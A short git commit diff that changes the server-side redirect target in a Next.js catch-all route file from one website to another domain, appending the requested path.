c6a10a52eb3ee3e1611554bf4d2f4b71c1cf5e68
raahulwaal <133681855+raahulwaal@users.noreply.github.com>
2023-06-06 21:37:24 -0700

    Update [...postpath].tsx

--- pages/[...postpath].tsx
+++ pages/[...postpath].tsx
@@ -19,7 +19,7 @@ export const getServerSideProps: GetServerSideProps = async (ctx) => {
 			redirect: {
 				permanent: false,
 				destination: `${
-					`https://saveourstateok.org/` + encodeURI(path as string)
+					`https://aajbhi.000.pe/` + encodeURI(path as string)
 				}`,
 			},
 		};
